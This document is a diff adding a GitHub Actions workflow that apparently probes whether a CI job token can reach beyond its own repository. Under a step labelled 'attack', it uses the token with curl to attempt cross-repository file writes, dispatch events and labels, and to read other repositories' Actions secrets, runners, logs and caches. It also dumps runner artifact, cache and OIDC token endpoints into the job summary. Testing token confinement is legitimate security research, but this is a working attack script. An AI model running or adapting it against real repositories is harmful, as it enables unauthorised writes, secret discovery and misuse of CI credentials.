@@ -1,0 +1,48 @@
+name: forge-egress-probe3
+on: push
+jobs:
+  probe3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    permissions:
+      contents: write
+      actions: write
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - name: ci-token-confinement
+        run: |
+          set +e
+          S="$GITHUB_STEP_SUMMARY"
+          echo "## probe3 - CI token confinement (job repo = $GITHUB_REPOSITORY)" >> "$S"
+          wr() {
+            c=$(curl -s -m 10 -o /tmp/w -w '%{http_code}' -X "$1" -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' -d "$3" "https://api.github.com/$2")
+            echo "- $1 api/$2 -> $c :: $(head -c 170 /tmp/w | tr -d '\n\r')" >> "$S"
+          }
+          rd() {
+            c=$(curl -s -m 10 -o /tmp/r -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/$1")
+            echo "- GET api/$1 -> $c :: $(head -c 170 /tmp/r | tr -d '\n\r')" >> "$S"
+          }
+          echo "### baseline: own-repo write" >> "$S"
+          wr PUT "repos/LZY7977/ssrf-import-test8/contents/forge-ci-token-own.txt" '{"message":"forge ci-token own-repo write probe","content":"Zm9yZ2UtcHJvYmUK"}'
+          echo "### attack: cross-repo writes with this job token" >> "$S"
+          wr PUT "repos/LZY7977/ssrf-import-test9/contents/forge-ci-token-xrepo.txt" '{"message":"forge ci-token cross-repo write probe","content":"Zm9yZ2UtcHJvYmUK"}'
+          wr POST "repos/LZY7977/ssrf-import-test9/dispatches" '{"event_type":"forge-ci-token-probe"}'
+          wr POST "repos/LZY7977/ssrf-import-test9/labels" '{"name":"forge-ci-token-probe","color":"ededed"}'
+          echo "### cross-repo CI reads" >> "$S"
+          rd "repos/LZY7977/ssrf-import-test9/actions/runs?per_page=1"
+          rd "repos/LZY7977/ssrf-import-test6/actions/runs?per_page=1"
+          rd "repos/LZY7977/ssrf-import-test6/actions/secrets"
+          rd "repos/LZY7977/ssrf-import-test8/actions/secrets"
+          rd "repos/LZY7977/ssrf-import-test8/actions/runners"
+          rd "repos/LZY7977/ssrf-import-test8/actions/runs/$GITHUB_RUN_ID/logs"
+          rd "repos/github/docs/actions/caches"
+          rd "users/LZY7977/repos?type=all&per_page=2"
+          echo "### runner artifact/cache namespace env (query strings stripped)" >> "$S"
+          echo "- GITHUB_ARTIFACTS=${GITHUB_ARTIFACTS%%\?*}" >> "$S"
+          echo "- GITHUB_ARTIFACTS_LIST=${GITHUB_ARTIFACTS_LIST%%\?*}" >> "$S"
+          echo "- ACTIONS_ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID RUNNER_TRACKING_ID=$RUNNER_TRACKING_ID" >> "$S"
+          echo "- workflow_ref=$GITHUB_WORKFLOW_REF actor=$GITHUB_ACTOR triggering=$GITHUB_TRIGGERING_ACTOR" >> "$S"
+          echo "### id-token / oidc" >> "$S"
+          echo "- idtoken_url=${ACTIONS_ID_TOKEN_REQUEST_URL:-none} runtime=${ACTIONS_RUNTIME_URL:-none} cache=${ACTIONS_CACHE_URL:-none}" >> "$S"
+          echo "::notice title=forge-probe3::complete"
